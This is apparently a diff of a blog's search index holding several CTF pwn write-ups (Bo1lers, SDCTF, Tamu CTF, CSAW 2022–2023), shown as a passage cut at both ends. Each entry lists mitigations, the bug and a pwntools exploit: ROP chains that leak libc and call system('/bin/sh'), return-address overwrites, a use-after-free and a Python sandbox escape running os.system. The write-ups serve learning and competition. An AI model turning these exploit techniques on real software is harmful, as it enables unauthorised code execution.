+sysmte(&quot;&#x2F;bin&#x2F;sh&quot;)
 
+then we got a shell.
+0x3 Exploitio &#x3D; start()
+wait_for_debugger(io)
+
+ret_addr &#x3D; exe_rop.find_gadget([&#39;ret&#39;])[0]
+pop_rdi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+print(pop_rdi_ret_addr,ret_addr)
+io.sendlineafter(b&quot;you?&quot;,flat(&#123;
+    0x40+0x8: [
+        ret_addr,
+        pop_rdi_ret_addr,
+        exe.got[&quot;printf&quot;],
+        exe.plt[&quot;puts&quot;],
+        pop_rdi_ret_addr,
+        exe.symbols[&quot;counter&quot;],
+        exe.plt[&quot;gets&quot;],
+        exe.sym[&quot;main&quot;],
+    ]
+&#125;))
+print(io.recvuntil(b&#39;too.\n&#39;))
+libc_base_addr &#x3D; int.from_bytes(io.recvuntil(b&#39;\n&#39;,drop&#x3D;True),&quot;little&quot;) - libc.sym[&quot;printf&quot;]
+input(hex(libc_base_addr))
+io.sendline(flat(&#123;0:[0]&#125;))
+print(hex(libc_base_addr+libc.sym[&quot;system&quot;]))
+io.sendlineafter(b&quot;you? &quot;,flat(&#123;
+    0x40:b&quot;AAAAAAAA&quot;,
+    0x40+0x8: [
+        ret_addr,
+        pop_rdi_ret_addr,
+        libc_base_addr+next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;)),
+        libc_base_addr+libc.sym[&quot;system&quot;],
+    ]
+&#125;))
 io.interactive()
 
-0x4 Flagforgot
+
+0x4 Flagactf{i&#39;d_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}
 ]]></content>
   </entry>
   <entry>
@@ -14438,20 +14390,52 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
-    <title>[Rev] MeMbrEy0 LEaK [CSAW CTF 2022 Final]</title>
-    <url>/ctf-writeup/2022/csawfinal/misc/MeMbrEy0_LEaK/index.html</url>
-    <content><![CDATA[Introductionfile service.py
-Solutiontodo
+    <title>[Pwn] gambler-overflow [Bo1lers CTF 2022]</title>
+    <url>/ctf-writeup/2022/bo1lers/pwn/gambler-overflow/index.html</url>
+    <content><![CDATA[0x0 IntroductionFeeling luuuuuuuucky?
+You must create a flag.txt in the same folder as the binary for it to run.nc ctf.b01lers.com 9203
+Author: robotearthpizzaDifficulty: Easy
+files: gambler_overflow
+0x1 MitigationArch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+
+0x2 Vulnerabilityfunction sym.casino ask for a 4 byte string using gets, then it compare with a random string generate by sym.imp.rand(). 
+If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag
+│           ; var signed int64_t var_1ch @ rbp-0x1c
+│           ; var char *s2 @ rbp-0x18
+│           ; var char *s1 @ rbp-0x10
+│           ; var int64_t canary @ rbp-0x8
+&#123;
+    do &#123;
+        &#x2F;&#x2F; generate random string
+        sym.imp.gets(&amp;s2);
+        iVar1 &#x3D; sym.imp.strcmp(&amp;s1);
+        &#x2F;&#x2F; add or subtract balance depend on the result
+    &#125; while (_obj.balance &lt; 1000);
+    sym.give_flag();
+    return;
+&#125;
+
+it uses gets, so we can overwrite s1 by s2. so that we can make s2 and s1 same.
+0x3 Exploitfrom pwn import *
+
+
+io &#x3D; start()
+try:
+    while True:
+        lp(io.sendlineafter(b&quot;letters: &quot;,b&quot;AAAAAAA\x00AAAAAAA\x00&quot;))
+except:
+    pass
+print(io.recv())
+
+
+io.interactive()
+
+0x4 Flagforgot
 ]]></content>
-  </entry>
-  <entry>
-    <title>[Rev] SupEr GUeSsEr G@me [CSAW CTF 2022 Final]</title>
-    <url>/ctf-writeup/2022/csawfinal/misc/SupEr_GUeSsEr_Game/index.html</url>
-    <content><![CDATA[Introductionfile service.py
-Solutiontodo
-&#39;&#39;&#39;
-[setattr([obj for obj in [x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;gc&#39;).get_objects() if (&#39;__name__&#39; in dir(obj)) and (&#39;__main__&#39; in obj.__name__)][0].__builtins__,&#39;set&#39;,lambda x:[]),setattr([obj for obj in [x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;gc&#39;).get_objects() if (&#39;__name__&#39; in dir(obj)) and (&#39;__main__&#39; in obj.__name__)][0].__builtins__,&#39;print&#39;,lambda y:[x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;os&#39;).system(&#39;ls&#39;))]
-&#39;&#39;&#39;]]></content>
   </entry>
   <entry>
     <title>[Pwn] gambler-supreme [Bo1lers CTF 2022]</title>
@@ -14512,6 +14496,22 @@ print(io.recv())
 io.interactive()
 
 0x4 Flagforgot
+]]></content>
+  </entry>
+  <entry>
+    <title>[Rev] SupEr GUeSsEr G@me [CSAW CTF 2022 Final]</title>
+    <url>/ctf-writeup/2022/csawfinal/misc/SupEr_GUeSsEr_Game/index.html</url>
+    <content><![CDATA[Introductionfile service.py
+Solutiontodo
+&#39;&#39;&#39;
+[setattr([obj for obj in [x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;gc&#39;).get_objects() if (&#39;__name__&#39; in dir(obj)) and (&#39;__main__&#39; in obj.__name__)][0].__builtins__,&#39;set&#39;,lambda x:[]),setattr([obj for obj in [x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;gc&#39;).get_objects() if (&#39;__name__&#39; in dir(obj)) and (&#39;__main__&#39; in obj.__name__)][0].__builtins__,&#39;print&#39;,lambda y:[x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;BuiltinImporter&#39;][0]().load_module(&#39;os&#39;).system(&#39;ls&#39;))]
+&#39;&#39;&#39;]]></content>
+  </entry>
+  <entry>
+    <title>[Rev] MeMbrEy0 LEaK [CSAW CTF 2022 Final]</title>
+    <url>/ctf-writeup/2022/csawfinal/misc/MeMbrEy0_LEaK/index.html</url>
+    <content><![CDATA[Introductionfile service.py
+Solutiontodo
 ]]></content>
   </entry>
   <entry>
@@ -14806,53 +14806,6 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn] Horoscope [SDCTF 2022]</title>
-    <url>/ctf-writeup/2022/sdctf/pwn/horoscope/index.html</url>
-    <content><![CDATA[0x0 IntroductionEasy
-This program will predict your future!
-Connectnc horoscope.sdc.tf 1337
-By green beans
-files: horoscope
-0x1 MitigationArch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-
-0x2 Vulnerabilitybinary have a /bin/sh backdoor in function sym.test.
-main has a buffer overflow vulnerbility, we can change rip of main to sym.test and get shell.
-0x3 Exploit#!&#x2F;usr&#x2F;bin&#x2F;env python3
-
-from pwn import *
-
-exe &#x3D; ELF(&quot;.&#x2F;horoscope&quot;)
-
-context.binary &#x3D; exe
-
-
-def conn():
-    if args.LOCAL:
-        r &#x3D; process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r)
-    else:
-        r &#x3D; remote(&quot;horoscope.sdc.tf&quot;,1337)
-
-    return r
-
-io &#x3D; conn()
-if args.R2:
-    input(&quot;asd&quot;)
-io.sendlineafter(b&quot;own horoscope\n&quot;,flat(&#123;
-    0:b&quot;01&#x2F;01&#x2F;2001&#x2F;1234\x00&quot;,
-    0x30+8:0x0040095f
-&#125;))
-io.interactive()
-
-0x4 Flagsdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}
-]]></content>
-  </entry>
-  <entry>
     <title>[Warmup] flagcat [Nahamcon CTF 2022]</title>
     <url>/ctf-writeup/2022/nahamcon/warmup/flagcat/index.html</url>
     <content><![CDATA[0x0 IntroductionAuthor: @JohnHammond#6971
@@ -14995,6 +14948,53 @@ io.interactive()
 
 
 0x4 Flagsdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] Horoscope [SDCTF 2022]</title>
+    <url>/ctf-writeup/2022/sdctf/pwn/horoscope/index.html</url>
+    <content><![CDATA[0x0 IntroductionEasy
+This program will predict your future!
+Connectnc horoscope.sdc.tf 1337
+By green beans
+files: horoscope
+0x1 MitigationArch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+
+0x2 Vulnerabilitybinary have a /bin/sh backdoor in function sym.test.
+main has a buffer overflow vulnerbility, we can change rip of main to sym.test and get shell.
+0x3 Exploit#!&#x2F;usr&#x2F;bin&#x2F;env python3
+
+from pwn import *
+
+exe &#x3D; ELF(&quot;.&#x2F;horoscope&quot;)
+
+context.binary &#x3D; exe
+
+
+def conn():
+    if args.LOCAL:
+        r &#x3D; process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r &#x3D; remote(&quot;horoscope.sdc.tf&quot;,1337)
+
+    return r
+
+io &#x3D; conn()
+if args.R2:
+    input(&quot;asd&quot;)
+io.sendlineafter(b&quot;own horoscope\n&quot;,flat(&#123;
+    0:b&quot;01&#x2F;01&#x2F;2001&#x2F;1234\x00&quot;,
+    0x30+8:0x0040095f
+&#125;))
+io.interactive()
+
+0x4 Flagsdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}
 ]]></content>
   </entry>
   <entry>
@@ -15503,151 +15503,6 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn] CTF Sim [Tamu CTF 2022]</title>
-    <url>/ctf-writeup/2022/tamuctf/pwn/ctf_sim/index.html</url>
-    <content><![CDATA[0x0 IntroductionAuthor: Lane
-Wanna take a break from the ctf to do another ctf?
-libc is glibc-2.28 on Debian Buster
-SNI: ctf-sim
-files: ctf_sim, ctf_sim.cpp
-0x1 MitigationArch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-
-0x2 Vulnerabilitylooking at the code, there is a very trivial dangling pointer in obj.download. After a challenge is deleted, obj.downlaod still have a pointer point to the original heap address.
-Thats said, after we free a challenge. we can use submitWriteup to malloc a same lengh of data in the heap, this will return the same address as before.
-Then, we can write win_addr into the heap and call solveChallenge again. Then we will successfully enter win function and get a shell.
-0x3 Exploitfrom pwn import *
-
-
-class BinaryInfo:
-    exe &#x3D; &quot;ctf_sim&quot;
-    libc &#x3D; &quot;&quot;
-
-    host &#x3D; &quot;rua.host.goes.here&quot;
-    port &#x3D; 8000
-
-
-# Set up pwntools for the correct architecture
-exe &#x3D; context.binary &#x3D; ELF(BinaryInfo.exe)
-exe_rop &#x3D; ROP(exe)
-if BinaryInfo.libc !&#x3D; &quot;&quot;:
-    libc &#x3D; ELF(BinaryInfo.libc)
-    libc_rop &#x3D; ROP(libc)
-else:
-    libc &#x3D; None
-    libc_rop &#x3D; None
-
-
-# Many built-in settings can be controlled on the command-line and show up
-# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
-# for all created processes...
-# .&#x2F;exploit.py DEBUG NOASLR
-# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
-host &#x3D; args.HOST or BinaryInfo.host
-port &#x3D; int(args.PORT or BinaryInfo.port)
-
-
-def start_local(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-
-def start_remote(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
-    io &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;ctf-sim&quot;)
-    if args.GDB:
-        gdb.attach(io, gdbscript&#x3D;gdbscript)
-    return io
-
-
-def start(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
-    if args.LOCAL:
-        return start_local(argv, *a, **kw)
-    else:
-        return start_remote(argv, *a, **kw)
-
-
-# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-#                    EXPLOIT GOES HERE
-# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-#    Arch:     amd64-64-little
-#    RELRO:    Partial RELRO
-#    Stack:    No canary found
-#    NX:       NX enabled
-#    PIE:      No PIE (0x400000)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# .&#x2F;exploit.py GDB
-gdbscript &#x3D; &#39;&#39;&#39;
-tbreak main
-continue
-&#39;&#39;&#39;.format(**locals())
-
-io &#x3D; start()
-
-
-win_addr &#x3D; exe.symbols[&quot;win_addr&quot;]
-
-
-io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;1&#39;)
-io.sendlineafter(b&quot;Crypto\n&gt; &quot;,b&#39;3&#39;)
-io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
-io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;2&#39;)
-io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
-io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;3&#39;)
-io.sendlineafter(b&quot;writeup?\n&gt; &quot;,b&#39;16&#39;)
-io.sendlineafter(b&quot;writeup\n&gt; &quot;,flat(&#123;0:win_addr&#125;))
-io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;2&#39;)
-io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
-io.interactive()
-
-0x4 Flaggigem{h34pl355_1n_53477l3}
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] Trivial [Tamu CTF 2022]</title>
-    <url>/ctf-writeup/2022/tamuctf/pwn/trivial/index.html</url>
-    <content><![CDATA[0x0 IntroductionAuthor: nhwn
-Feeling lucky? I have just the challenge for you :D
-SNI: lucky
-files: trivial, trival.c
-0x1 MitigationArch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-
-0x2 VulnerabilityVery trivial buffer overflow in main. Overwrite rip to function win to get a shell
-void main() &#123;
-    char buff[69];
-
-    gets(buff);
-&#125;
-
-0x3 Exploitfrom pwn import *
-
-context.binary &#x3D; ELF(&quot;trivial&quot;)
-
-p &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;trivial&quot;)
-p.sendline(flat(&#123;
-    0x50+0x8:[
-        0x00401132
-    ]
-&#125;))
-p.interactive()
-
-0x4 Flaggigem{sorry_for_using_the_word_trivial}
-]]></content>
-  </entry>
-  <entry>
     <title>[Pwn] Rop Golf [Tamu CTF 2022]</title>
     <url>/ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html</url>
     <content><![CDATA[0x0 IntroductionAuthor: sky
@@ -15913,85 +15768,148 @@ log_print(io.recv())
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]</title>
-    <url>/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html</url>
-    <content><![CDATA[DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt
-files
-AnalysisArch:     amd64-64-little
-RELRO:    No RELRO
+    <title>[Pwn] CTF Sim [Tamu CTF 2022]</title>
+    <url>/ctf-writeup/2022/tamuctf/pwn/ctf_sim/index.html</url>
+    <content><![CDATA[0x0 IntroductionAuthor: Lane
+Wanna take a break from the ctf to do another ctf?
+libc is glibc-2.28 on Debian Buster
+SNI: ctf-sim
+files: ctf_sim, ctf_sim.cpp
+0x1 MitigationArch:     amd64-64-little
+RELRO:    Partial RELRO
 Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
 
+0x2 Vulnerabilitylooking at the code, there is a very trivial dangling pointer in obj.download. After a challenge is deleted, obj.downlaod still have a pointer point to the original heap address.
+Thats said, after we free a challenge. we can use submitWriteup to malloc a same lengh of data in the heap, this will return the same address as before.
+Then, we can write win_addr into the heap and call solveChallenge again. Then we will successfully enter win function and get a shell.
+0x3 Exploitfrom pwn import *
 
-loadermy analysis database s.bndb
-This binary is run by a python loaders. python loader is acting like a debugger.
-Everytime a breakpoint instruction (0xcc) being executed. python loader will check next byte after rip. And determine what to do next depend on that byte.
-for example, if next byte is 0x48. it will replace some register
 
-otherwise, if the next byte is equal to some other bytes. it will do a canary check manually
+class BinaryInfo:
+    exe &#x3D; &quot;ctf_sim&quot;
+    libc &#x3D; &quot;&quot;
 
-vulnerability 1 - canary check failedit did have canary check. The canary values are actually saved return pointers. However, when comparing return pointers, it only check if return pointer exists in the stack. So, we can still modify the saved return pointer to the caller&#39;s saved return pointer.
-vulnerability 2 - overwritingBascially, the binary contains 2 main function. encrypt and decrypt
-decrypt function calls a function which read all bytes until it meet a new line character (\n). This is a trivial buffer overflow we can use to modify return pointer.
-using this vulnerability with the previous one, we can run main function again.
-since _start function is essentially a loop if return value of main is not equal to 1
+    host &#x3D; &quot;rua.host.goes.here&quot;
+    port &#x3D; 8000
 
-vulnerability 3 - random generationencrypt function generating random values by reading /dev/urandom. And store using input is .bss section.
-it also use a global variable to record index of the data array. everytime we call encrypt, the index will increase by one.
 
-normally it&#39;s okay, because we are only executing encrypt function once.
-however, since we can run encrypt function multiple time. we increase the index value until we overwrite /dev/urandom string.
-conclusionwe overwrite /dev/urandom, and the program will print out the flag for us!
-Exploitfrom pwn import *
+# Set up pwntools for the correct architecture
+exe &#x3D; context.binary &#x3D; ELF(BinaryInfo.exe)
+exe_rop &#x3D; ROP(exe)
+if BinaryInfo.libc !&#x3D; &quot;&quot;:
+    libc &#x3D; ELF(BinaryInfo.libc)
+    libc_rop &#x3D; ROP(libc)
+else:
+    libc &#x3D; None
+    libc_rop &#x3D; None
 
-exe &#x3D; ELF(&quot;s&quot;)
-# exe_rop &#x3D; ROP(exe)
-# libc &#x3D; ELF(&quot;libc.so.6&quot;)
-# ld &#x3D; ELF(&quot;.&#x2F;ld-2.27.so&quot;)
 
-context.binary &#x3D; exe
-# context.log_level &#x3D; &#39;DEBUG&#39;
+# Many built-in settings can be controlled on the command-line and show up
+# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
+# for all created processes...
+# .&#x2F;exploit.py DEBUG NOASLR
+# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
+host &#x3D; args.HOST or BinaryInfo.host
+port &#x3D; int(args.PORT or BinaryInfo.port)
 
-def wait(*msg):
-    if args.WAIT:
-        input(&quot; &quot;.join(map(str,msg)))
 
-def log_print(*msg):
-    log.info(&quot; &quot;.join(map(str,msg)))
-lp &#x3D; log_print
-def start():
-    if args.LOCAL:
-        r &#x3D; process([&quot;python&quot;,&quot;.&#x2F;loader.py&quot;])
-        r.recvuntil(b&quot;pid&#x3D;&quot;)
-        pid &#x3D; int(r.recvuntil(b&quot;;\n&quot;,drop&#x3D;True))
-        print(&quot;pid of the binary is %d&quot; % pid)
-        if args.R2:
-            util.proc.wait_for_debugger(pid)
+def start_local(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
     else:
-        r &#x3D; remote(&quot;ctf.b01lers.com&quot;, 5215)
-    return r
+        return process([exe.path] + argv, *a, **kw)
 
+
+def start_remote(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;ctf-sim&quot;)
+    if args.GDB:
+        gdb.attach(io, gdbscript&#x3D;gdbscript)
+    return io
+
+
+def start(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+#                    EXPLOIT GOES HERE
+# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+#    Arch:     amd64-64-little
+#    RELRO:    Partial RELRO
+#    Stack:    No canary found
+#    NX:       NX enabled
+#    PIE:      No PIE (0x400000)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# .&#x2F;exploit.py GDB
+gdbscript &#x3D; &#39;&#39;&#39;
+tbreak main
+continue
+&#39;&#39;&#39;.format(**locals())
 
 io &#x3D; start()
-flagstring &#x3D; b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)
-nonesense &#x3D; b&#39;\x00&#39;*0x10
-payload &#x3D; flat(&#123;
-    0x0: b&#39;\x00&#39;*0x10, # make all 0, easier for xor
-    0x38:[
-        0x00004005e2, # _start if eax&#x3D;1, call main again 
+
+
+win_addr &#x3D; exe.symbols[&quot;win_addr&quot;]
+
+
+io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;1&#39;)
+io.sendlineafter(b&quot;Crypto\n&gt; &quot;,b&#39;3&#39;)
+io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
+io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;2&#39;)
+io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
+io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;3&#39;)
+io.sendlineafter(b&quot;writeup?\n&gt; &quot;,b&#39;16&#39;)
+io.sendlineafter(b&quot;writeup\n&gt; &quot;,flat(&#123;0:win_addr&#125;))
+io.sendlineafter(b&quot;Quit\n&gt; &quot;,b&#39;2&#39;)
+io.sendlineafter(b&quot;(0-3)\n&gt; &quot;,b&#39;0&#39;)
+io.interactive()
+
+0x4 Flaggigem{h34pl355_1n_53477l3}
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] Trivial [Tamu CTF 2022]</title>
+    <url>/ctf-writeup/2022/tamuctf/pwn/trivial/index.html</url>
+    <content><![CDATA[0x0 IntroductionAuthor: nhwn
+Feeling lucky? I have just the challenge for you :D
+SNI: lucky
+files: trivial, trival.c
+0x1 MitigationArch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+
+0x2 VulnerabilityVery trivial buffer overflow in main. Overwrite rip to function win to get a shell
+void main() &#123;
+    char buff[69];
+
+    gets(buff);
+&#125;
+
+0x3 Exploitfrom pwn import *
+
+context.binary &#x3D; ELF(&quot;trivial&quot;)
+
+p &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;trivial&quot;)
+p.sendline(flat(&#123;
+    0x50+0x8:[
+        0x00401132
     ]
-&#125;)+b&#39;\n&#39;
-# filled up data
-for i in range(8):
-    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
-    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)
-    io.sendafter(b&quot;Your key?:\n&quot;,payload)
-# overflow &#x2F;dev&#x2F;urandom
-io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
-io.recvuntil(b&quot;Your key:\n&quot;)
-lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop&#x3D;True))
-io.close()
+&#125;))
+p.interactive()
+
+0x4 Flaggigem{sorry_for_using_the_word_trivial}
 ]]></content>
   </entry>
   <entry>
@@ -16178,6 +16096,139 @@ io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn
 io.interactive()
 
 0x4 Flaggigem{1_6u355_7h475_h0w_w3_3xpl017_17}
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]</title>
+    <url>/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html</url>
+    <content><![CDATA[DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt
+files
+AnalysisArch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+
+
+loadermy analysis database s.bndb
+This binary is run by a python loaders. python loader is acting like a debugger.
+Everytime a breakpoint instruction (0xcc) being executed. python loader will check next byte after rip. And determine what to do next depend on that byte.
+for example, if next byte is 0x48. it will replace some register
+
+otherwise, if the next byte is equal to some other bytes. it will do a canary check manually
+
+vulnerability 1 - canary check failedit did have canary check. The canary values are actually saved return pointers. However, when comparing return pointers, it only check if return pointer exists in the stack. So, we can still modify the saved return pointer to the caller&#39;s saved return pointer.
+vulnerability 2 - overwritingBascially, the binary contains 2 main function. encrypt and decrypt
+decrypt function calls a function which read all bytes until it meet a new line character (\n). This is a trivial buffer overflow we can use to modify return pointer.
+using this vulnerability with the previous one, we can run main function again.
+since _start function is essentially a loop if return value of main is not equal to 1
+
+vulnerability 3 - random generationencrypt function generating random values by reading /dev/urandom. And store using input is .bss section.
+it also use a global variable to record index of the data array. everytime we call encrypt, the index will increase by one.
+
+normally it&#39;s okay, because we are only executing encrypt function once.
+however, since we can run encrypt function multiple time. we increase the index value until we overwrite /dev/urandom string.
+conclusionwe overwrite /dev/urandom, and the program will print out the flag for us!
+Exploitfrom pwn import *
+
+exe &#x3D; ELF(&quot;s&quot;)
+# exe_rop &#x3D; ROP(exe)
+# libc &#x3D; ELF(&quot;libc.so.6&quot;)
+# ld &#x3D; ELF(&quot;.&#x2F;ld-2.27.so&quot;)
+
+context.binary &#x3D; exe
+# context.log_level &#x3D; &#39;DEBUG&#39;
+
+def wait(*msg):
+    if args.WAIT:
+        input(&quot; &quot;.join(map(str,msg)))
+
+def log_print(*msg):
+    log.info(&quot; &quot;.join(map(str,msg)))
+lp &#x3D; log_print
+def start():
+    if args.LOCAL:
+        r &#x3D; process([&quot;python&quot;,&quot;.&#x2F;loader.py&quot;])
+        r.recvuntil(b&quot;pid&#x3D;&quot;)
+        pid &#x3D; int(r.recvuntil(b&quot;;\n&quot;,drop&#x3D;True))
+        print(&quot;pid of the binary is %d&quot; % pid)
+        if args.R2:
+            util.proc.wait_for_debugger(pid)
+    else:
+        r &#x3D; remote(&quot;ctf.b01lers.com&quot;, 5215)
+    return r
+
+
+io &#x3D; start()
+flagstring &#x3D; b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)
+nonesense &#x3D; b&#39;\x00&#39;*0x10
+payload &#x3D; flat(&#123;
+    0x0: b&#39;\x00&#39;*0x10, # make all 0, easier for xor
